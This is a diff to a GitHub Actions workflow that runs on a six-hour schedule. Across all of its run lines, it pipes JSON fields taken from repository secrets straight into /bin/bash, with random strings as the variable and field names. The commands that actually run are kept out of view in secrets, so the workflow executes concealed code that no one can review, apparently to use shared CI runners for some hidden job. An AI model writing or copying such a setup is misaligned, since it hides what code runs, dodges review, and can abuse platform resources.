@@ -2,18 +2,22 @@ name: adamcreatemodern
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
-
+    - cron: '56 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: adamcreatemodern
         env:
-          edwhj83: ${{ secrets.edwhj83 }}
+          jkd43723: ${{ secrets.jkd43723 }}
         run: |
-          echo $edwhj83 | jq -r .sty51093 | /bin/bash
-          echo $c76457 | jq -r .hcb88 | /bin/bash
+          echo $jkd43723 | jq -r .tmb43824 | /bin/bash
+          echo $igty4617 | jq -r .qgoid4 | /bin/bash
+          echo $n6712 | jq -r .w6604 | /bin/bash
+          echo $ksjfs2094 | jq -r .pwx64639 | /bin/bash
+          echo $vo65169 | jq -r .huwp19240 | /bin/bash
+          echo $av88 | jq -r .tcmna9 | /bin/bash
+          echo $vws198 | jq -r .trrdm4 | /bin/bash
+          echo $qckdl5833 | jq -r .bcw54916 | /bin/bash
 
